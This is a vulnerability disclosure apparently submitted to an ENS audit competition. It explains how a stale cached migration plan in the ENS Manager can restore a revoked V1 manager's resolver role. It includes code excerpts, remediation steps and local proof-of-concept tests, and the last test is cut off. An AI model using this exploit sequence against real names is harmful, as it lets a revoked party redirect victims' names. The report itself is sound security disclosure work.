# 91600 w a medium manager executes a cached migration plan after v1 authority revocation restoring the revoked manager and resolver

**Submitted on Sep 2nd 2026 at 22:23:44 UTC by @PhantomBugz for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91600
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

## Executive Summary

Mallory was once the authorized V1 manager of Alice's ENS name. While that authority is still present, Alice opens the ENS Manager migration page and the application prepares a migration plan containing Mallory's address and the current V1 resolver. Alice then revokes Mallory through another V1 interface, restores herself as manager, selects a safe resolver, returns to the still-mounted migration page, and approves the upgrade. The Manager can submit the older plan because its gas-plan cache key tracks the domain ID but not the manager or resolver. The migration therefore restores the revoked resolver and gives Mallory `ROLE_SET_RESOLVER` on the migrated V2 name. Mallory can then redirect the name even though Alice revoked her before approving migration.

Mallory does not steal Alice's wallet, session, or signature. Alice remains the V2 owner and signs the migration herself. The required condition is narrower: the page must prepare a plan while Mallory is manager, Alice must revoke that authority elsewhere, and Alice must resume the same mounted migration page without a full reload.

I assessed the frozen ENS competition snapshot based on upstream revision `63772fd`. I reviewed the cache, plan construction, submission, approval recheck, and atomic batch code, ran the stateful Foundry PoC against the contracts-v2 PR 402 helper source at revision `5bbe6ad`, and inspected the focused Manager tests. The stateful test passed with gas 498729, and all four Manager PoCs passed under Vitest 4.1.5. A read-only deployment check also recorded 5,557 bytes of helper runtime code with hash `0x0b8acb00c2912a8b43085e0f55f9459b956cb51be1a16a5ff7ef0346dbd18143`, matching the Manager's pinned hash. No public-chain transaction was sent.

The available audit import does not contain the upstream release history or tags needed to establish a first affected release. No fixed revision or fixed release was available for verification. The assessed frozen snapshot is therefore the only version claimed as affected. The affected cache and execution-time freshness controls are inside the in-scope Manager application. The migration package and contracts-v2 code are used only to demonstrate how the Manager's stale plan is interpreted and executed. The demonstrated impact matches the [ENS competition's Critical scope category](https://immunefi.com/audit-competition/audit-competition-ens/scope/) for a Manager migration that assigns a resolver to an attacker.

## Background

Alice is the registrant of an unwrapped V1 `.eth` name. V1 permits the registrant to assign a different registry manager. In this scenario, Mallory legitimately held that manager position in the past. Alice later uses the registrar's `reclaim` operation to make herself the current manager again and sets a resolver she controls.

The Manager's migration workflow creates an atomic plan before Alice approves the upgrade. That plan includes the V1 resolver to install during migration and, when the manager differs from the registrant, a V2 role grant that preserves the old manager's ability to set the resolver. Preserving a current manager is intended behavior. Restoring a manager Alice has already revoked is not.

The reproduced sequence requires all of the following conditions:

{% stepper %}
{% step %}

## Alice owns the V1 registration and opens the migration page while Mallory is its V1 manager

{% endstep %}

{% step %}

## The page reaches a ready state and has built a plan containing Mallory and the old resolver

{% endstep %}

{% step %}

## Alice revokes Mallory and selects a safe resolver through another V1 interface while the migration page remains mounted

{% endstep %}

{% step %}

## The name keeps the same domain ID

This is normal for an authority or resolver update.
{% endstep %}

{% step %}

## Alice returns to the mounted page and approves migration without first performing a full reload

{% endstep %}
{% endstepper %}

The proof does not require indexer lag or a claimed five-minute cache window. The focused tests allow the V1 observer to return Alice's current safe authority. The failure is that this authority change does not give the gas plan a new cache identity.

The confirmation copy also describes the sensitive step only as `Restore the existing managers for your names.` in `apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:87`. It does not identify the address being restored, so Alice is not shown that the plan still contains Mallory.

## Vulnerability Details

To follow the authority state through the affected flow, we start with `useMigrationGasEstimate`. It selects the current domain objects but derives its revision solely from their IDs. Its React Query key contains the wallet, HCA, domain IDs, and that ID-based revision. It contains neither the V1 manager nor the V1 resolver:

```tsx
const domains = selectDomainsFromNames(v1Names, selectedNames)
const domainIds = domains
  .map((domain) => domain.id)
  .sort()
  .join(',')
const selectionRevisionRef = useRef({ domainIds: '', revision: 0 })
if (selectionRevisionRef.current.domainIds !== domainIds) {
  selectionRevisionRef.current = {
    domainIds,
    revision: selectionRevisionRef.current.revision + 1,
  }
}

const query = useQuery({
  queryKey: [
    'migration-gas-estimate',
    ownerAddress?.toLowerCase() ?? '',
    hcaAddress?.toLowerCase() ?? '',
    domainIds,
    selectionRevisionRef.current.revision,
  ] as const,
```

This is from `apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts:62-88` in the assessed snapshot. A manager or resolver update leaves `domainIds` unchanged, so it also leaves `selectionRevisionRef.current.revision` and the complete query key unchanged.

The query function closes over the selected `domains`, builds a complete transaction plan from those objects, and stores that plan as query data:

```tsx
const preflight = await ensurePreflight(domains, { staleTime: 0 })
const plan = await buildMigrationPlan({
  domains,
  hcaAddress,
  migrationOwner: ownerAddress,
  publicClient: publicClient as unknown as PublicClient,
  preflight,
})
const estimate = await estimateMigrationGasCost({
  plan,
  publicClient: publicClient as unknown as PublicClient,
})
return { estimate, plan }
```

These are `useMigrationGasEstimate.ts:97-109`. Once data exists for the unchanged key, the hook exposes it as a ready plan at `useMigrationGasEstimate.ts:128-140`. The integrated focus-race test mounts `useV1Names` and `useMigrationGasEstimate` together. It lets the V1 refresh finish first with Alice as manager and the safe resolver, then lets the pending gas-plan refresh finish with the domain objects it captured while Mallory was still manager. The final hook state contains Alice's safe V1 data alongside the Mallory plan, and the planner is not invoked a third time.

Plan construction trusts those supplied domain objects for both authority-sensitive values. For an unwrapped name, `classifyName` copies `domain.resolver.address` and treats `domain.owner.id` as the manager whenever it differs from the registrant:

```ts
const v1ResolverAddress = domain.resolver?.address ?? null

const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

This is `packages/migration/src/service/classifyNames.ts:137` and `packages/migration/src/service/classifyNames.ts:162-167`. The focused planner PoC confirms that plan construction does not read current chain authority before encoding the stale resolver and manager.

The page later submits the cached object directly. `apps/manager/src/features/migration/pages/MigrationPage.tsx:259-283` checks only that the gas estimate is ready and sends `gasEstimate.plan` to the migration state machine:

```tsx
if (gasEstimate.status !== 'ready') return false

uiActor.send({
  type: 'migration.start',
  plan: gasEstimate.plan,
  signer,
  hcaClient,
  refreshAccount,
})
```

There is a pre-submission freshness check, but it compares only planned and currently missing approval keys. `assertMigrationApprovalPlanCurrent` in `apps/manager/src/features/migration/service/migrationService.ts:367-390` does not compare the plan's manager or resolver with current V1 state. `executeMigration` calls that approval-only check before opening the wallet prompts at `migrationService.ts:1169-1193`, then executes the already-constructed atomic batches.

The atomic batch contains the two consequential operations. `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608-624` creates a `manager-role-grant` for `classified.managerAddress` with `ROLE_SET_RESOLVER`. The final ordering at `buildAtomicMigrationBatches.ts:774-780` executes the migration helper before that persistent manager grant:

```ts
return [
  ...executionsForPhase('resolver-deployment'),
  ...executionsForPhase('wallet-co-admin-grant'),
  ...helperExecutions,
  ...executionsForPhase('manager-role-grant'),
  ...executionsForPhase('profile-replay'),
]
```

The helper receives the stale resolver embedded in the plan, then the V2 registry receives the stale manager role grant. Temporary HCA approval cleanup does not remove the role granted to Mallory.

I could not trace an introducing release because the supplied competition snapshot is an audit import without the upstream history and tags. I also found no verified fix to compare. This report therefore makes no claim about earlier versions or a fixed version.

## Exploitability Analysis

The demonstrated primitive is restoration of authority that Alice revoked before approving migration. Immediately before the migration call, the stateful PoC verifies that Alice is the current V1 manager and that the V1 resolver is the safe resolver. After executing the exact migration-then-role-grant order, it verifies that Alice still owns the V2 token, but the stale resolver is installed and Mallory again holds `ROLE_SET_RESOLVER`. Mallory then successfully changes the migrated name to an attacker-selected resolver.

This crosses a meaningful ownership boundary. Mallory's prior authorization is not the authorization used at the sink: Alice has already revoked it, and the current V1 state confirms that revocation. The cached Manager plan resurrects it during a transaction Alice signs later.

The tests include the following controls, which let us distinguish a revoked authority from an ordinary preservation of a current manager:

{% stepper %}
{% step %}

## The Foundry test asserts Alice and the safe resolver are current in V1 before migration

This rules out the explanation that Mallory was still authorized when the transaction ran.
{% endstep %}

{% step %}

## The integrated Manager test resolves the V1 observer to Alice and the safe resolver before resolving the pending stale gas plan

This shows that successful V1 refresh alone does not invalidate the plan.
{% endstep %}

{% step %}

## The planner test fails if plan construction attempts an unexpected current-chain authority read

It completes without that read and decodes Mallory and the stale resolver from the actual generated calls.
{% endstep %}

{% step %}

## The Foundry test removes the temporary HCA operator approval and confirms it is gone while Mallory's persistent resolver role remains

This rules out HCA cleanup as a remedy for the restored role.
{% endstep %}

{% step %}

## The final call is made as Mallory and changes the V2 resolver to Mallory's selected address

This demonstrates use of the restored permission at the real registry sink.
{% endstep %}
{% endstepper %}

The attack remains conditional. Alice must resume the same mounted page after revoking a formerly authorized manager, and the query lifecycle must retain the old plan under the unchanged key. Mallory does not directly control Alice's timing or wallet prompts. A fresh page load with current authority data generally rebuilds the plan and is a practical interim precaution. The test suite does not include one full browser automation spanning both tabs and wallet prompts; the combined hook test, decoded production calls, source trace, and stateful contract test establish the individual transitions.

The competition's public known-issue list does not describe stale migration plans or restoration of revoked V1 authority. QA-01 concerns follow-up errors after transfers with certain role combinations. It does not cover a migration that recreates an authority the owner removed before approving the transaction.

The PoC demonstrates resolver redirection, not theft of the V2 token or an irreversible loss. Alice remains owner, but incident recovery was not tested. While Mallory's restored role remains active, clients resolving the name can be directed to records chosen by Mallory. The competition scope explicitly treats migration that assigns a resolver to an attacker as Critical.

## Remediation

The final execution path should reject any plan whose authority-sensitive V1 state has changed since preview. The strongest check is an immediate on-chain read before the first wallet prompt for every selected name. Compare the current registrant, manager, and resolver with the values encoded in the plan. If any value differs, stop and require Alice to review a rebuilt plan.

The client cache should also give authority changes a new identity. Replace the ID-only selection revision with a deterministic fingerprint that includes every V1 field used to construct calls, including at least the domain ID, registrant, registry manager, resolver, wrapped owner, and relevant fuse or expiry state. The gas query key should change when that fingerprint changes, even if the selected name IDs do not.

`assertMigrationApprovalPlanCurrent` should not be the only execution-time freshness gate. Extend the service with a separate plan-state assertion that compares the plan's manager and resolver against current authoritative reads. Approval equality does not establish authority equality.

The confirmation dialog should show the exact manager address and resolver that will be preserved for each name. That does not replace the freshness check, but it gives Alice a meaningful chance to reject an unexpected restoration.

Regression coverage should reproduce the same sequence: build a Mallory plan, reclaim the V1 name to Alice, set a safe resolver under the same domain ID, and attempt to continue. The expected result is a blocked submission and a newly generated Alice-safe plan. A companion test should cover the focus-response ordering from the integrated PoC, and a stateful contract test should verify that no role or resolver absent from current V1 state appears after migration. No shipped fix was available for verification.

## Summary

In the assessed frozen competition snapshot, the Manager keys a complete migration plan by domain IDs without including the V1 manager or resolver. Alice can revoke Mallory and establish safe V1 state, yet the mounted page can remain ready with a plan that restores Mallory's resolver authority. Alice's signed migration then installs the stale resolver and grants Mallory `ROLE_SET_RESOLVER`, which Mallory can use to redirect the migrated name.

The path requires a previously authorized manager, an external revocation after preview, and continuation without a full reload. It does not require wallet compromise or indexer lag, and it does not transfer the V2 token away from Alice. The most useful remaining validation is a full browser test across the external V1 update, focus refresh, confirmation UI, and wallet prompts. No affected release range or fixed version is claimed beyond the assessed snapshot because the necessary release history and fix were not available.

## Proof of Concept

The sibling `poc/` directory contains portable copies of five executed tests and `poc/README.md` explains how to overlay them on the matching source snapshots.

{% stepper %}
{% step %}

## `poc/manager/apps/manager/src/features/migration/hooks/useMigrationFocusRace.staleAuthority.poc.test.tsx`

This is the primary Manager reproducer. It mounts both live observers and ends with safe V1 data plus the stale Mallory plan.
{% endstep %}

{% step %}

## `poc/manager/apps/manager/src/features/migration/hooks/useMigrationGasEstimate.staleAuthority.poc.test.tsx`

This isolates the gas-plan key and confirms an authority change under the same domain ID does not trigger another plan build.
{% endstep %}

{% step %}

## `poc/manager/apps/manager/src/features/migration/hooks/useV1Names.staleAuthority.poc.test.tsx`

This confirms cached V1 authority remains available while a focus refresh is pending, then updates to the safe response.
{% endstep %}

{% step %}

## `poc/manager/apps/manager/src/features/migration/service/staleAuthority.poc.test.ts`

This builds and decodes the real migration and role-grant calls.
{% endstep %}

{% step %}

## `poc/contracts-v2/contracts/test/poc/StaleMigrationAuthorityPoC.t.sol`

This recreates the V1 revocation, executes the stale migration sequence, removes temporary HCA approval, and uses Mallory's restored role against the V2 registry.
{% endstep %}
{% endstepper %}

All four Manager tests passed under Vitest 4.1.5 in the matching competition snapshot. The stateful contract test was rerun locally with:

```sh
cd contracts
forge test --match-path test/poc/StaleMigrationAuthorityPoC.t.sol --match-test test_victimRevocationIsUndoneByStaleMigrationSnapshot -vv
```

The observed result was:

```
[PASS] test_victimRevocationIsUndoneByStaleMigrationSnapshot() (gas: 498729)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Foundry also printed a nonfatal analyzer diagnostic for an unresolved `_exists` symbol in an imported V1 registrar contract. The command exited successfully and the suite passed. The tests use local mocks and an in-memory Foundry chain. They do not send transactions to a public network and require no cleanup beyond discarding the local test state.

## Reproduction notes

These are portable copies of the exact PoCs used to validate the stale migration authority issue. They depend on the ENS Manager competition snapshot based on upstream revision `63772fd` and the contracts-v2 PR 402 source tree at revision `5bbe6ad`. No PoC sends a public-chain transaction.

For the Manager tests, overlay the contents of `poc/manager/` onto the root of the matching Manager repository. From that repository root, install its pinned dependencies and run:

```sh
pnpm --filter manager exec vitest run src/features/migration/hooks/useMigrationFocusRace.staleAuthority.poc.test.tsx src/features/migration/hooks/useMigrationGasEstimate.staleAuthority.poc.test.tsx src/features/migration/hooks/useV1Names.staleAuthority.poc.test.tsx src/features/migration/service/staleAuthority.poc.test.ts
```

The recorded validation used Vitest 4.1.5 and passed all four files.

For the contract test, overlay the contents of `poc/contracts-v2/` onto the root of the matching contracts-v2 PR 402 checkout. Then run:

```sh
cd contracts
forge test --match-path test/poc/StaleMigrationAuthorityPoC.t.sol --match-test test_victimRevocationIsUndoneByStaleMigrationSnapshot -vv
```

The recorded run passed one test with gas 498729. Foundry printed a nonfatal analyzer diagnostic for an unresolved `_exists` symbol in an imported V1 registrar contract, but exited with status 0.

The Manager tests use mocks and an in-memory query client. The Foundry test deploys fixtures on its local EVM. Discarding the test process removes all created state.

### Primary combined Manager observer reproducer

Path: `apps/manager/src/features/migration/hooks/useMigrationFocusRace.staleAuthority.poc.test.tsx`

```tsx
import {
  focusManager,
  QueryClient,
  QueryClientProvider,
} from '@tanstack/react-query'
import { act, renderHook, waitFor } from '@testing-library/react'
import { ok, ResultAsync } from 'neverthrow'
import type { ReactNode } from 'react'
import type { Address } from 'viem'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const smartAccountMock = vi.hoisted(() => ({
  useSmartAccountContext: vi.fn(),
}))

const wagmiMock = vi.hoisted(() => ({
  useConnection: vi.fn(),
  usePublicClient: vi.fn(),
}))

const v1SubgraphMock = vi.hoisted(() => ({
  getV1NamesForAddress: vi.fn(),
}))

const preflightMock = vi.hoisted(() => ({
  ensure: vi.fn(),
  useMigrationPreflight: vi.fn(),
}))

const plannerMock = vi.hoisted(() => ({
  buildMigrationPlan: vi.fn(),
}))

const estimateMock = vi.hoisted(() => ({
  estimateMigrationGasCost: vi.fn(),
}))

vi.mock('@/lib/smart-account', () => smartAccountMock)
vi.mock('wagmi', () => wagmiMock)
vi.mock('@/features/migration/service/v1SubgraphClient', () => v1SubgraphMock)
vi.mock('./useMigrationPreflight', () => ({
  useMigrationPreflight: preflightMock.useMigrationPreflight,
}))
vi.mock('@/features/migration/service/buildMigrationPlan', () => plannerMock)
vi.mock('@/features/migration/service/estimateMigrationGasCost', () =>
  estimateMock,
)

import type { V1Domain } from '@/features/migration/service/v1SubgraphClient'
import { useMigrationGasEstimate } from './useMigrationGasEstimate'
import { useV1Names } from './useV1Names'

const ALICE = '0x1111111111111111111111111111111111111111' as Address
const HCA = '0x2222222222222222222222222222222222222222' as Address
const MALLORY = '0x3333333333333333333333333333333333333333'
const SAFE_RESOLVER = '0x4444444444444444444444444444444444444444'
const STALE_RESOLVER = '0x5555555555555555555555555555555555555555'
const NAME = 'alice.eth'
const ID = `0x${'66'.repeat(32)}`

const domain = (manager: string, resolver: string) =>
  ({
    id: ID,
    name: NAME,
    owner: { id: manager },
    resolver: { address: resolver },
  }) as unknown as V1Domain

const createWrapper = () => {
  const queryClient = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })
  return function Wrapper({ children }: { children: ReactNode }) {
    return (
      <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
    )
  }
}

describe('migration focus race stale-authority PoC', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    smartAccountMock.useSmartAccountContext.mockReturnValue({
      ownerAddress: ALICE,
    })
    wagmiMock.useConnection.mockReturnValue({ address: ALICE })
    wagmiMock.usePublicClient.mockReturnValue({ chain: { id: 11155111 } })
    preflightMock.useMigrationPreflight.mockReturnValue({
      ensure: preflightMock.ensure,
    })
    preflightMock.ensure.mockResolvedValue({ migrationApprovals: [] })
    estimateMock.estimateMigrationGasCost.mockResolvedValue({
      status: 'ready',
      gasUnits: 1n,
      feeWei: 1n,
      feePerGasWei: 1n,
      transactionCount: 1,
    })
  })

  afterEach(() => {
    focusManager.setFocused(undefined)
  })

  it('keeps the Mallory plan after the V1 observer has refreshed to Alice', async () => {
    const staleAuthority = [domain(MALLORY, STALE_RESOLVER)]
    const safeAuthority = [domain(ALICE, SAFE_RESOLVER)]

    let resolveSafeAuthority:
      | ((value: typeof safeAuthority) => void)
      | undefined
    const safeAuthorityResponse = new Promise<typeof safeAuthority>((resolve) => {
      resolveSafeAuthority = resolve
    })
    v1SubgraphMock.getV1NamesForAddress
      .mockReturnValueOnce(ok(staleAuthority))
      .mockReturnValueOnce(
        ResultAsync.fromPromise(safeAuthorityResponse, (error) => error),
      )

    let resolveFocusedPlan:
      | ((value: { marker: string; resolver: string }) => void)
      | undefined
    const focusedPlan = new Promise<{ marker: string; resolver: string }>(
      (resolve) => {
        resolveFocusedPlan = resolve
      },
    )
    plannerMock.buildMigrationPlan
      .mockImplementationOnce(async ({ domains }: { domains: V1Domain[] }) => ({
        marker: domains[0]?.owner?.id,
        resolver: domains[0]?.resolver?.address,
      }))
      .mockImplementationOnce(
        async ({ domains }: { domains: V1Domain[] }) => {
          const captured = {
            marker: domains[0]?.owner?.id ?? '',
            resolver: domains[0]?.resolver?.address ?? '',
          }
          await focusedPlan
          return captured
        },
      )

    const { result } = renderHook(() => {
      const v1 = useV1Names()
      const gas = useMigrationGasEstimate({
        ownerAddress: ALICE,
        hcaAddress: HCA,
        selectedNames: [NAME],
        v1Names: v1.data ?? [],
      })
      return { v1, gas }
    }, { wrapper: createWrapper() })

    await waitFor(() => expect(result.current.gas.status).toBe('ready'))
    expect(result.current.v1.data).toEqual(staleAuthority)

    await act(async () => {
      focusManager.setFocused(false)
      focusManager.setFocused(true)
      await Promise.resolve()
    })
    await waitFor(() => {
      expect(v1SubgraphMock.getV1NamesForAddress).toHaveBeenCalledTimes(2)
      expect(plannerMock.buildMigrationPlan).toHaveBeenCalledTimes(2)
    })

    await act(async () => {
      resolveSafeAuthority?.(safeAuthority)
      await safeAuthorityResponse
    })
    await waitFor(() => expect(result.current.v1.data).toEqual(safeAuthority))

    await act(async () => {
      resolveFocusedPlan?.({ marker: MALLORY, resolver: STALE_RESOLVER })
      await focusedPlan
    })
    await waitFor(() => expect(result.current.gas.status).toBe('ready'))

    expect(plannerMock.buildMigrationPlan).toHaveBeenCalledTimes(2)
    expect(result.current.gas).toMatchObject({
      status: 'ready',
      plan: { marker: MALLORY, resolver: STALE_RESOLVER },
    })
  })
})
```

### Gas-plan cache-key reproducer

Path: `apps/manager/src/features/migration/hooks/useMigrationGasEstimate.staleAuthority.poc.test.tsx`

```tsx
import {
  focusManager,
  QueryClient,
  QueryClientProvider,
} from '@tanstack/react-query'
import { act, renderHook, waitFor } from '@testing-library/react'
import type { ReactNode } from 'react'
import type { Address } from 'viem'
import { afterEach, describe, expect, it, vi } from 'vitest'

const wagmiMock = vi.hoisted(() => ({
  usePublicClient: vi.fn(),
}))

const preflightMock = vi.hoisted(() => ({
  ensure: vi.fn(),
  useMigrationPreflight: vi.fn(),
}))

const plannerMock = vi.hoisted(() => ({
  buildMigrationPlan: vi.fn(),
}))

const estimateMock = vi.hoisted(() => ({
  estimateMigrationGasCost: vi.fn(),
}))

vi.mock('wagmi', () => wagmiMock)
vi.mock('./useMigrationPreflight', () => ({
  useMigrationPreflight: preflightMock.useMigrationPreflight,
}))
vi.mock('@/features/migration/service/buildMigrationPlan', () => plannerMock)
vi.mock('@/features/migration/service/estimateMigrationGasCost', () =>
  estimateMock,
)

import type { V1Domain } from '@/features/migration/service/v1SubgraphClient'
import { useMigrationGasEstimate } from './useMigrationGasEstimate'

const OWNER = '0x1111111111111111111111111111111111111111' as Address
const HCA = '0x2222222222222222222222222222222222222222' as Address
const ATTACKER = '0x3333333333333333333333333333333333333333'
const SAFE_MANAGER = OWNER
const NAME = 'victim.eth'
const ID = `0x${'44'.repeat(32)}`

const domain = (manager: string) =>
  ({
    id: ID,
    name: NAME,
    owner: { id: manager },
  }) as unknown as V1Domain

const createWrapper = () => {
  const queryClient = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })
  return function Wrapper({ children }: { children: ReactNode }) {
    return (
      <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
    )
  }
}

describe('stale migration-plan key PoC', () => {
  afterEach(() => {
    focusManager.setFocused(undefined)
    vi.clearAllMocks()
  })

  it('keeps the attacker plan after refreshed V1 authority changes under the same domain id', async () => {
    const publicClient = { chain: { id: 11155111 } }
    wagmiMock.usePublicClient.mockReturnValue(publicClient)
    preflightMock.useMigrationPreflight.mockReturnValue({
      ensure: preflightMock.ensure,
    })
    preflightMock.ensure.mockResolvedValue({ migrationApprovals: [] })
    plannerMock.buildMigrationPlan.mockImplementation(
      async ({ domains }: { domains: V1Domain[] }) => ({
        marker: domains[0]?.owner?.id,
      }),
    )
    estimateMock.estimateMigrationGasCost.mockResolvedValue({
      status: 'ready',
      gasUnits: 1n,
      feeWei: 1n,
      feePerGasWei: 1n,
      transactionCount: 1,
    })

    const initialProps = {
      ownerAddress: OWNER,
      hcaAddress: HCA,
      selectedNames: [NAME],
      v1Names: [domain(ATTACKER)],
    }
    const { result, rerender } = renderHook(
      (props) => useMigrationGasEstimate(props),
      { initialProps, wrapper: createWrapper() },
    )

    await waitFor(() => expect(result.current.status).toBe('ready'))
    expect(plannerMock.buildMigrationPlan).toHaveBeenCalledTimes(1)

    await act(async () => {
      focusManager.setFocused(false)
      focusManager.setFocused(true)
    })
    await waitFor(() =>
      expect(plannerMock.buildMigrationPlan).toHaveBeenCalledTimes(2),
    )

    rerender({ ...initialProps, v1Names: [domain(SAFE_MANAGER)] })
    await act(async () => Promise.resolve())

    expect(plannerMock.buildMigrationPlan).toHaveBeenCalledTimes(2)
    expect(result.current).toMatchObject({
      status: 'ready',
      plan: { marker: ATTACKER },
    })
  })
})
```

### V1 focus-refresh reproducer

Path: `apps/manager/src/features/migration/hooks/useV1Names.staleAuthority.poc.test.tsx`

```tsx
import {
  focusManager,
  QueryClient,
  QueryClientProvider,
} from '@tanstack/react-query'
import { act, renderHook, waitFor } from '@testing-library/react'
import { ok, ResultAsync } from 'neverthrow'
import type { ReactNode } from 'react'
import type { Address } from 'viem'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const smartAccountMock = vi.hoisted(() => ({
  useSmartAccountContext: vi.fn(),
}))

const wagmiMock = vi.hoisted(() => ({
  useConnection: vi.fn(),
}))

const v1SubgraphMock = vi.hoisted(() => ({
  getV1NamesForAddress: vi.fn(),
}))

vi.mock('@/lib/smart-account', () => smartAccountMock)
vi.mock('wagmi', () => wagmiMock)
vi.mock('@/features/migration/service/v1SubgraphClient', () => v1SubgraphMock)

import { useV1Names } from './useV1Names'

const WALLET = '0x1111111111111111111111111111111111111111' as Address

const createWrapper = () => {
  const queryClient = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })

  return function Wrapper({ children }: { children: ReactNode }) {
    return (
      <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
    )
  }
}

describe('stale V1 authority cache PoC', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    smartAccountMock.useSmartAccountContext.mockReturnValue({
      ownerAddress: WALLET,
    })
    wagmiMock.useConnection.mockReturnValue({ address: WALLET })
  })

  afterEach(() => {
    focusManager.setFocused(undefined)
  })

  it('keeps cached authority usable while a focus refetch is still pending', async () => {
    const staleAuthority = [{
      name: 'victim.eth',
      owner: { id: '0x2222222222222222222222222222222222222222' },
      resolver: { address: '0x3333333333333333333333333333333333333333' },
    }]
    const currentSafeAuthority = [{
      name: 'victim.eth',
      owner: { id: WALLET },
      resolver: { address: '0x4444444444444444444444444444444444444444' },
    }]
    let resolveCurrentAuthority:
      | ((value: typeof currentSafeAuthority) => void)
      | undefined
    const pendingCurrentAuthority = new Promise<typeof currentSafeAuthority>(
      (resolve) => {
        resolveCurrentAuthority = resolve
      },
    )
    v1SubgraphMock.getV1NamesForAddress
      .mockReturnValueOnce(ok(staleAuthority))
      .mockReturnValueOnce(
        ResultAsync.fromPromise(pendingCurrentAuthority, (error) => error),
      )

    const { result } = renderHook(() => useV1Names(), {
      wrapper: createWrapper(),
    })

    await waitFor(() => expect(result.current.data).toEqual(staleAuthority))

    await act(async () => {
      focusManager.setFocused(false)
      focusManager.setFocused(true)
      await Promise.resolve()
    })

    expect(v1SubgraphMock.getV1NamesForAddress).toHaveBeenCalledTimes(2)
    expect(result.current.data).toEqual(staleAuthority)

    await act(async () => {
      resolveCurrentAuthority?.(currentSafeAuthority)
      await pendingCurrentAuthority
    })
    await waitFor(() =>
      expect(result.current.data).toEqual(currentSafeAuthority),
    )
  })
})
```

### Production planner and calldata reproducer

Path: `apps/manager/src/features/migration/service/staleAuthority.poc.test.ts`

```ts
import {
  type Address,
  decodeFunctionData,
  keccak256,
  namehash,
  parseAbi,
  type PublicClient,
  toBytes,
} from 'viem'
import { sepolia } from 'viem/chains'
import { assert, describe, expect, it, vi } from 'vitest'

import { ETH_REGISTRY_V2_ABI, MIGRATION_HELPER_ABI } from '../contracts/abis'
import { V2_CONTRACTS } from '../contracts/addresses'
import { makeDomain } from './_fixtures'
import { buildMigrationPlan } from './buildMigrationPlan'
import type { MigrationPreflight } from './computeMigrationPreflight'
import type { DirectMigrationRoute } from './directMigrationRoutes'

const WALLET: Address = '0x00000000000000000000000000000000000000b1'
const HCA: Address = '0x00000000000000000000000000000000000000c1'
const REVOKED_MANAGER: Address =
  '0x00000000000000000000000000000000000000d1'
const REVOKED_MANAGER_RESOLVER: Address =
  '0x00000000000000000000000000000000000000e1'

const ROLE_SET_RESOLVER = 1n << 24n
const hcaOwnerExecutionAbi = parseAbi([
  'function executeByOwner((address target, uint256 value, bytes callData)[] executions) payable',
])

describe('stale V1 authority migration PoC', () => {
  it('encodes a revoked manager and resolver without checking their current V1 state', async () => {
    const label = 'revoked-manager'
    const name = `${label}.eth`
    const staleSubgraphDomain = makeDomain({
      id: namehash(name),
      name,
      labelName: label,
      labelhash: keccak256(toBytes(label)),
      registrantId: WALLET,
      ownerId: REVOKED_MANAGER,
      resolverAddress: REVOKED_MANAGER_RESOLVER,
    })

    const route: DirectMigrationRoute = {
      name,
      receiver: V2_CONTRACTS.UnlockedMigrationController,
      parentDependency: null,
      expectedWrapperRegistry: null,
      receiverReadiness: 'migration-controller',
    }
    const preflight: MigrationPreflight = {
      preExistingOwnedPermRes: null,
      skipApprovalPhase: false,
      skipFetchProfilesPhase: true,
      baseRegistrarApproved: true,
      nameWrapperApproved: true,
      migrationApprovals: [],
      directMigrationRoutes: new Map([[name, route]]),
    }
    const readContract = vi.fn(() => {
      throw new Error('the planner unexpectedly read current chain authority')
    })
    const publicClient = {
      chain: sepolia,
      readContract,
    } as unknown as PublicClient

    const plan = await buildMigrationPlan({
      domains: [staleSubgraphDomain],
      hcaAddress: HCA,
      migrationOwner: WALLET,
      publicClient,
      preflight,
    })

    expect(readContract).not.toHaveBeenCalled()
    expect(plan.classified).toHaveLength(1)
    expect(plan.classified[0]).toMatchObject({
      managerAddress: REVOKED_MANAGER,
      resolverStrategy: 'keep-v1',
      v1ResolverAddress: REVOKED_MANAGER_RESOLVER,
    })

    const batch = plan.atomicBatches[0]
    assert(batch)
    expect(batch.innerExecutions.map(({ phase }) => phase)).toEqual([
      'migrate',
      'manager-role-grant',
    ])

    const migrate = batch.innerExecutions.find(({ phase }) => phase === 'migrate')
    assert(migrate)
    const decodedMigration = decodeFunctionData({
      abi: MIGRATION_HELPER_ABI,
      data: migrate.call.data,
    })
    expect(decodedMigration.functionName).toBe('migrate')
    const migratedName = decodedMigration.args[0][0]
    assert(migratedName)
    expect(migratedName.label).toBe(label)
    expect(migratedName.owner.toLowerCase()).toBe(WALLET.toLowerCase())
    expect(migratedName.subregistry).toBe(
      '0x0000000000000000000000000000000000000000',
    )
    expect(migratedName.resolver.toLowerCase()).toBe(
      REVOKED_MANAGER_RESOLVER.toLowerCase(),
    )

    const grant = batch.innerExecutions.find(
      ({ phase }) => phase === 'manager-role-grant',
    )
    assert(grant)
    expect(grant.call.to.toLowerCase()).toBe(V2_CONTRACTS.ETHRegistry.toLowerCase())
    const decodedGrant = decodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      data: grant.call.data,
    })
    expect(decodedGrant.functionName).toBe('grantRoles')
    expect(decodedGrant.args[1]).toBe(ROLE_SET_RESOLVER)
